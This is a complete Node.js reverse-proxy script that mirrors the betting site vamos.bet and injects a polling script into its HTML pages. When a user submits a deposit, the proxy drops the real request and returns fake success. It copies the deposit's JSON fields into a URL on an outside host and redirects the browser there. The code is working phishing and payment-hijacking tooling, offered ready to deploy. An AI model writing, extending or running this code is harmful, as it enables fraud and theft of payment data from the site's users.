import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";
import { Transform } from "node:stream";

/*
|--------------------------------------------------------------------------
| CONFIGURATION
|--------------------------------------------------------------------------
*/

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Upstream website
// IMPORTANT: hostname only, no https://
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Redirect trigger
const REDIRECT_API_PATH =
  "/api/v2/transactions/deposit";

// Redirect destination
const REDIRECT_BASE_URL =
  "https://poopay-pp-yot-4249.ai.studio/";

// Session lifetime
const REDIRECT_TTL_MS = 60_000;

// Maximum body buffered for the special API
const MAX_BODY_SIZE =
  1 * 1024 * 1024;

// Timeouts
const UPSTREAM_TIMEOUT_MS = 30_000;
const CLIENT_TIMEOUT_MS = 120_000;


/*
|--------------------------------------------------------------------------
| CLIENT STATE
|--------------------------------------------------------------------------
*/

const clients = new Map();


/*
|--------------------------------------------------------------------------
| UPSTREAM HTTPS CONNECTION POOL
|--------------------------------------------------------------------------
*/

const upstreamAgent =
  new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 1_000,

    /*
     * Increase this if your VPS has enough resources.
     */
    maxSockets: 300,
    maxFreeSockets: 100,

    timeout: 60_000
  });


/*
|--------------------------------------------------------------------------
| CLIENT ID
|--------------------------------------------------------------------------
*/

function createClientId() {
  return crypto.randomUUID();
}


function getClientId(req) {
  const cookieHeader =
    req.headers.cookie || "";

  const match =
    cookieHeader.match(
      /(?:^|;\s*)proxy_client_id=([^;]+)/
    );

  return match
    ? match[1]
    : null;
}


function getOrCreateClient(req) {
  let id =
    getClientId(req);

  if (!id) {
    id = createClientId();
  }

  let state =
    clients.get(id);

  if (!state) {

    state = {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now(),
      lastSeen: Date.now()
    };

    clients.set(
      id,
      state
    );

  } else {

    state.lastSeen =
      Date.now();
  }

  return id;
}


/*
|--------------------------------------------------------------------------
| SESSION CLEANUP
|--------------------------------------------------------------------------
*/

const cleanupTimer =
  setInterval(() => {

    const now =
      Date.now();

    for (
      const [id, state]
      of clients.entries()
    ) {

      if (
        now - state.lastSeen >
        REDIRECT_TTL_MS
      ) {

        clients.delete(id);
      }
    }

  }, 15_000);

cleanupTimer.unref();


/*
|--------------------------------------------------------------------------
| REMOVE HOP-BY-HOP HEADERS
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(
  headers
) {
  const result = {
    ...headers
  };

  const connection =
    result.connection;

  if (connection) {

    const connectionHeaders =
      connection
        .split(",")
        .map(v =>
          v.trim().toLowerCase()
        );

    for (
      const header
      of connectionHeaders
    ) {

      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  /*
   * IMPORTANT:
   * Prevent Content-Length +
   * Transfer-Encoding conflict with Nginx.
   */
  delete result["transfer-encoding"];

  return result;
}


/*
|--------------------------------------------------------------------------
| ADD OUR PROXY COOKIE
|--------------------------------------------------------------------------
*/

function addProxyCookie(
  headers,
  clientId
) {
  const result = {
    ...headers
  };

  const proxyCookie =
    `proxy_client_id=${clientId}; Path=/; HttpOnly; Secure; SameSite=Lax`;

  const existing =
    result["set-cookie"];

  if (!existing) {

    result["set-cookie"] = [
      proxyCookie
    ];

  } else if (
    Array.isArray(existing)
  ) {

    result["set-cookie"] = [
      ...existing,
      proxyCookie
    ];

  } else {

    result["set-cookie"] = [
      existing,
      proxyCookie
    ];
  }

  return result;
}


/*
|--------------------------------------------------------------------------
| BUILD UPSTREAM HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(
  clientReq
) {

  const headers = {
    ...clientReq.headers,

    /*
     * Upstream sees the real hostname.
     */
    host: TARGET_HOSTNAME
  };

  /*
   * Never forward these connection-specific headers.
   */
  delete headers.connection;

  /*
   * Node will determine the correct body framing.
   */
  delete headers["content-length"];

  /*
   * For HTML document requests we need an uncompressed
   * response because we inject our watcher.
   *
   * For other requests preserve the client's preferred
   * compression.
   */
  const accept =
    String(
      clientReq.headers.accept || ""
    ).toLowerCase();

  const isDocumentRequest =
    clientReq.method === "GET" &&
    accept.includes("text/html");

  if (isDocumentRequest) {
    headers["accept-encoding"] =
      "identity";
  }

  return headers;
}


/*
|--------------------------------------------------------------------------
| STREAMING HTML INJECTOR
|--------------------------------------------------------------------------
|
| IMPORTANT:
|
| The old implementation buffered the entire HTML page.
|
| This version keeps only a few bytes around while looking
| for </head>, then immediately streams the rest.
|
|--------------------------------------------------------------------------
*/

function createHtmlInjector() {

  const injection =
    Buffer.from(
      '<script src="/__proxy_redirect.js" defer></script>',
      "utf8"
    );

  let foundHead = false;

  /*
   * </head> is only 7 ASCII bytes.
   *
   * Keeping 32 bytes is enough to handle the tag
   * being split across network chunks.
   */
  const KEEP_BYTES = 32;

  let carry =
    Buffer.alloc(0);

  return new Transform({

    transform(
      chunk,
      encoding,
      callback
    ) {

      try {

        if (foundHead) {

          this.push(chunk);

          callback();
          return;
        }

        /*
         * Combine the small carry buffer with
         * the new network chunk.
         */
        const data =
          carry.length > 0
            ? Buffer.concat([
                carry,
                chunk
              ])
            : chunk;

        /*
         * Search using latin1 only for locating
         * the ASCII </head> bytes.
         *
         * We preserve the ORIGINAL buffer bytes.
         */
        const searchable =
          data
            .toString("latin1")
            .toLowerCase();

        const index =
          searchable.indexOf(
            "</head>"
          );

        if (index !== -1) {

          /*
           * Send everything before </head>.
           */
          this.push(
            data.subarray(
              0,
              index
            )
          );

          /*
           * Inject watcher immediately before
           * the closing </head>.
           */
          this.push(injection);

          /*
           * Send original </head> and everything
           * after it.
           */
          this.push(
            data.subarray(index)
          );

          foundHead = true;

          carry =
            Buffer.alloc(0);

          callback();
          return;
        }

        /*
         * The tag wasn't found.
         *
         * Stream everything except a tiny tail so
         * </head> can still be detected if it is
         * split across chunks.
         */
        if (
          data.length >
          KEEP_BYTES
        ) {

          const split =
            data.length -
            KEEP_BYTES;

          this.push(
            data.subarray(
              0,
              split
            )
          );

          carry =
            data.subarray(
              split
            );

        } else {

          carry =
            data;
        }

        callback();

      } catch (error) {

        callback(error);
      }
    },

    flush(callback) {

      try {

        /*
         * If </head> never appeared, don't lose
         * the remaining bytes.
         */
        if (
          carry.length > 0
        ) {

          this.push(carry);
        }

        callback();

      } catch (error) {

        callback(error);
      }
    }

  });
}


/*
|--------------------------------------------------------------------------
| REDIRECT WATCHER
|--------------------------------------------------------------------------
*/

function sendRedirectScript(
  clientRes
) {

  const script = `
(function () {

  "use strict";

  let redirected = false;

  async function checkRedirect() {

    if (redirected) {
      return;
    }

    try {

      const response =
        await fetch(
          "/__proxy_redirect_status",
          {
            method: "GET",
            cache: "no-store",
            credentials: "same-origin"
          }
        );

      if (!response.ok) {
        return;
      }

      const data =
        await response.json();

      if (
        data.redirect === true &&
        typeof data.url === "string" &&
        data.url.length > 0
      ) {

        redirected = true;

        console.log(
          "[Proxy] Redirecting browser:",
          data.url
        );

        window.location.replace(
          data.url
        );
      }

    } catch {
      /*
       * Ignore temporary proxy errors.
       */
    }
  }

  /*
   * Initial check.
   */
  checkRedirect();

  /*
   * Poll every 700ms.
   */
  setInterval(
    checkRedirect,
    700
  );

})();
`;

  clientRes.writeHead(
    200,
    {
      "Content-Type":
        "application/javascript; charset=utf-8",

      "Cache-Control":
        "no-store, no-cache, must-revalidate",

      "Content-Length":
        Buffer.byteLength(
          script
        )
    }
  );

  clientRes.end(script);
}


/*
|--------------------------------------------------------------------------
| REDIRECT STATUS
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(
  state,
  clientRes,
  clientId
) {

  const shouldRedirect =
    Boolean(
      state?.redirected
    );

  const redirectUrl =
    state?.redirectUrl || null;

  /*
   * Consume the redirect state.
   *
   * This is important:
   * if the user clicks Back, the old redirect
   * won't immediately fire again.
   */
  if (
    shouldRedirect &&
    state
  ) {

    state.redirected =
      false;

    state.redirectUrl =
      null;

    state.lastSeen =
      Date.now();
  }

  const response =
    JSON.stringify({
      redirect:
        shouldRedirect,

      url:
        redirectUrl
    });

  let headers = {
    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(
        response
      )
  };

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    200,
    headers
  );

  clientRes.end(
    response
  );
}


/*
|--------------------------------------------------------------------------
| HTML RESPONSE
|--------------------------------------------------------------------------
*/

function handleHtmlResponse(
  upstreamRes,
  clientRes,
  clientId
) {

  let headers =
    removeHopByHopHeaders(
      upstreamRes.headers
    );

  /*
   * We cannot keep the original Content-Length
   * because we're inserting a script.
   */
  delete headers[
    "content-length"
  ];

  delete headers[
    "content-encoding"
  ];

  delete headers[
    "transfer-encoding"
  ];

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    upstreamRes.statusCode ||
      200,
    headers
  );

  /*
   * Stream HTML through the injector.
   *
   * The browser can receive HTML immediately
   * instead of waiting for the complete document.
   */
  const injector =
    createHtmlInjector();

  injector.on(
    "error",
    error => {

      console.error(
        "❌ HTML stream error:",
        error.message
      );

      clientRes.destroy();
    }
  );

  upstreamRes.on(
    "error",
    error => {

      console.error(
        "❌ Upstream HTML error:",
        error.message
      );

      injector.destroy(
        error
      );
    }
  );

  injector.pipe(
    clientRes
  );

  upstreamRes.pipe(
    injector
  );
}


/*
|--------------------------------------------------------------------------
| NORMAL RESPONSE
|--------------------------------------------------------------------------
*/

function handleNormalResponse(
  upstreamRes,
  clientRes,
  clientId
) {

  let headers =
    removeHopByHopHeaders(
      upstreamRes.headers
    );

  /*
   * Validate Content-Length when present.
   */
  if (
    headers[
      "content-length"
    ] !== undefined
  ) {

    const length =
      Number(
        headers["content-length"]
      );

    if (
      !Number.isFinite(length) ||
      length < 0
    ) {

      delete headers[
        "content-length"
      ];
    }
  }

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    upstreamRes.statusCode ||
      200,
    headers
  );

  upstreamRes.on(
    "error",
    error => {

      console.error(
        "❌ Upstream response error:",
        error.message
      );

      clientRes.destroy();
    }
  );

  upstreamRes.pipe(
    clientRes
  );
}


/*
|--------------------------------------------------------------------------
| FORWARD REQUEST
|--------------------------------------------------------------------------
*/

function forwardRequest(
  clientReq,
  clientRes,
  clientId,
  bufferedBody = null
) {

  const headers =
    buildUpstreamHeaders(
      clientReq
    );

  /*
   * Buffered body.
   */
  if (
    Buffer.isBuffer(
      bufferedBody
    )
  ) {

    headers[
      "content-length"
    ] =
      bufferedBody.length;
  }

  const options = {

    hostname:
      TARGET_HOSTNAME,

    port:
      TARGET_PORT,

    method:
      clientReq.method,

    path:
      clientReq.url,

    headers,

    agent:
      upstreamAgent,

    servername:
      TARGET_HOSTNAME,

    rejectUnauthorized:
      true
  };

  console.log(
    `→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`
  );

  const upstreamReq =
    https.request(
      options,
      upstreamRes => {

        console.log(
          `← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`
        );

        const contentType =
          upstreamRes.headers[
            "content-type"
          ] || "";

        /*
         * Only inject the watcher into actual
         * browser HTML documents.
         *
         * This avoids unnecessary processing
         * for HTML fragments/API responses.
         */
        const accept =
          String(
            clientReq.headers.accept ||
              ""
          ).toLowerCase();

        const isDocument =
          clientReq.method === "GET" &&
          accept.includes("text/html");

        if (
          contentType
            .toLowerCase()
            .includes("text/html") &&
          isDocument
        ) {

          handleHtmlResponse(
            upstreamRes,
            clientRes,
            clientId
          );

          return;
        }

        /*
         * Everything else is streamed untouched.
         */
        handleNormalResponse(
          upstreamRes,
          clientRes,
          clientId
        );
      }
    );

  /*
   * Upstream timeout.
   */
  upstreamReq.setTimeout(
    UPSTREAM_TIMEOUT_MS,
    () => {

      console.error(
        `❌ Upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`
      );

      upstreamReq.destroy(
        new Error(
          "Upstream timeout"
        )
      );
    }
  );

  /*
   * Upstream errors.
   */
  upstreamReq.on(
    "error",
    error => {

      console.error(
        "❌ Upstream error:",
        error.message
      );

      if (
        !clientRes.headersSent
      ) {

        clientRes.writeHead(
          502,
          {
            "Content-Type":
              "text/plain; charset=utf-8",

            "Cache-Control":
              "no-store"
          }
        );

        clientRes.end(
          "Bad Gateway"
        );

      } else {

        clientRes.destroy();
      }
    }
  );

  /*
   * Buffered request body.
   */
  if (
    Buffer.isBuffer(
      bufferedBody
    )
  ) {

    upstreamReq.end(
      bufferedBody
    );

    return;
  }

  /*
   * Normal streaming.
   */
  clientReq.pipe(
    upstreamReq
  );
}


/*
|--------------------------------------------------------------------------
| REDIRECT API
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(
  clientReq,
  clientRes,
  state,
  clientId
) {

  const chunks = [];

  let totalSize = 0;

  try {

    for await (
      const chunk of clientReq
    ) {

      totalSize +=
        chunk.length;

      if (
        totalSize >
        MAX_BODY_SIZE
      ) {

        clientRes.writeHead(
          413,
          {
            "Content-Type":
              "text/plain; charset=utf-8"
          }
        );

        clientRes.end(
          "Request body too large"
        );

        return;
      }

      chunks.push(chunk);
    }

  } catch (error) {

    console.error(
      "❌ Request body error:",
      error.message
    );

    clientRes.writeHead(
      400
    );

    clientRes.end(
      "Bad Request"
    );

    return;
  }

  const body =
    Buffer.concat(chunks);

  /*
   * ========================================
   * NO BODY
   * ========================================
   *
   * Forward normally.
   */

  if (
    body.length === 0
  ) {

    console.log(
      `↪ ${REDIRECT_API_PATH} has no body`
    );

    forwardRequest(
      clientReq,
      clientRes,
      clientId,
      body
    );

    return;
  }

  /*
   * ========================================
   * BODY EXISTS
   * ========================================
   */

  console.log("");
  console.log(
    "=========================================="
  );

  console.log(
    "🚨 REDIRECT TRIGGERED"
  );

  console.log(
    `Endpoint: ${REDIRECT_API_PATH}`
  );

  console.log(
    `Body size: ${body.length} bytes`
  );

  /*
   * Build destination URL.
   */
  const redirectUrl =
    new URL(
      REDIRECT_BASE_URL
    );

  /*
   * JSON body -> query parameters.
   */
  try {

    const json =
      JSON.parse(
        body.toString("utf8")
      );

    if (
      json &&
      typeof json === "object" &&
      !Array.isArray(json)
    ) {

      for (
        const [key, value]
        of Object.entries(json)
      ) {

        if (
          value === undefined ||
          value === null
        ) {
          continue;
        }

        redirectUrl.searchParams.set(
          key,
          String(value)
        );
      }

      console.log(
        "Request body:"
      );

      console.log(
        JSON.stringify(
          json,
          null,
          2
        )
      );

    } else {

      console.log(
        "Body is not a JSON object."
      );
    }

  } catch {

    /*
     * Body exists but isn't JSON.
     *
     * Still redirect to the base destination.
     */
    console.log(
      "Request body is non-JSON."
    );

    console.log(
      "Redirecting to base destination."
    );
  }

  const finalUrl =
    redirectUrl.toString();

  console.log(
    `➡ Destination: ${finalUrl}`
  );

  /*
   * Store one-time redirect state.
   */
  if (state) {

    state.redirected =
      true;

    state.redirectUrl =
      finalUrl;

    state.lastSeen =
      Date.now();
  }

  /*
   * IMPORTANT:
   *
   * We intentionally DO NOT call forwardRequest()
   * here.
   *
   * Therefore the original
   * /api/v2/test/redirect request is dropped.
   */

  const response =
    JSON.stringify({
      success: true,
      proxyRedirect: true
    });

  let headers = {

    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(
        response
      )
  };

  headers =
    addProxyCookie(
      headers,
      clientId
    );

  clientRes.writeHead(
    200,
    headers
  );

  clientRes.end(
    response
  );

  console.log(
    "🛑 Original API request dropped."
  );

  console.log(
    "=========================================="
  );

  console.log("");
}


/*
|--------------------------------------------------------------------------
| MAIN SERVER
|--------------------------------------------------------------------------
*/

const server =
  http.createServer(
    async (
      clientReq,
      clientRes
    ) => {

      /*
       * Client timeout.
       */
      clientReq.setTimeout(
        CLIENT_TIMEOUT_MS,
        () => {

          console.error(
            "❌ Client request timeout"
          );

          clientReq.destroy();
        }
      );

      try {

        const parsedUrl =
          new URL(
            clientReq.url,
            `http://${clientReq.headers.host || "localhost"}`
          );

        const path =
          parsedUrl.pathname;

        /*
         * Get/create browser session.
         */
        const clientId =
          getOrCreateClient(
            clientReq
          );

        const state =
          clients.get(
            clientId
          );

        console.log(
          `→ ${clientReq.method} ${clientReq.url}`
        );


        /*
         * ======================================
         * REDIRECT SCRIPT
         * ======================================
         */

        if (
          clientReq.method === "GET" &&
          path ===
            "/__proxy_redirect.js"
        ) {

          sendRedirectScript(
            clientRes
          );

          return;
        }


        /*
         * ======================================
         * REDIRECT STATUS
         * ======================================
         */

        if (
          clientReq.method === "GET" &&
          path ===
            "/__proxy_redirect_status"
        ) {

          handleRedirectStatus(
            state,
            clientRes,
            clientId
          );

          return;
        }


        /*
         * ======================================
         * REDIRECT API
         * ======================================
         */

        if (
          path ===
          REDIRECT_API_PATH
        ) {

          await handleRedirectRequest(
            clientReq,
            clientRes,
            state,
            clientId
          );

          return;
        }


        /*
         * ======================================
         * NORMAL PROXY
         * ======================================
         *
         * Always continue proxying.
         */

        forwardRequest(
          clientReq,
          clientRes,
          clientId
        );

      } catch (error) {

        console.error(
          "❌ Request handler error:",
          error
        );

        if (
          !clientRes.headersSent
        ) {

          clientRes.writeHead(
            500,
            {
              "Content-Type":
                "text/plain; charset=utf-8"
            }
          );
        }

        clientRes.end(
          "Internal Server Error"
        );
      }
    }
  );


/*
|--------------------------------------------------------------------------
| NODE SERVER SETTINGS
|--------------------------------------------------------------------------
*/

server.requestTimeout =
  CLIENT_TIMEOUT_MS;

server.headersTimeout =
  65_000;

server.keepAliveTimeout =
  65_000;

server.maxRequestsPerSocket =
  0;


/*
|--------------------------------------------------------------------------
| CLIENT ERRORS
|--------------------------------------------------------------------------
*/

server.on(
  "clientError",
  (error, socket) => {

    console.error(
      "❌ Client error:",
      error.message
    );

    if (
      socket.writable
    ) {

      socket.end(
        "HTTP/1.1 400 Bad Request\r\n\r\n"
      );
    }
  }
);


/*
|--------------------------------------------------------------------------
| PROCESS ERRORS
|--------------------------------------------------------------------------
*/

process.on(
  "uncaughtException",
  error => {

    console.error(
      "❌ uncaughtException:",
      error
    );
  }
);

process.on(
  "unhandledRejection",
  error => {

    console.error(
      "❌ unhandledRejection:",
      error
    );
  }
);


/*
|--------------------------------------------------------------------------
| START
|--------------------------------------------------------------------------
*/

server.listen(
  PROXY_PORT,
  PROXY_HOST,
  () => {

    console.log("");
    console.log(
      "=========================================="
    );

    console.log(
      " MarziPlus Reverse Proxy"
    );

    console.log(
      "=========================================="
    );

    console.log(
      `Local:    http://${PROXY_HOST}:${PROXY_PORT}`
    );

    console.log(
      `Upstream: https://${TARGET_HOSTNAME}`
    );

    console.log(
      `Trigger:  ${REDIRECT_API_PATH}`
    );

    console.log(
      `Redirect: ${REDIRECT_BASE_URL}?...`
    );

    console.log(
      "=========================================="
    );

    console.log("");
  }
);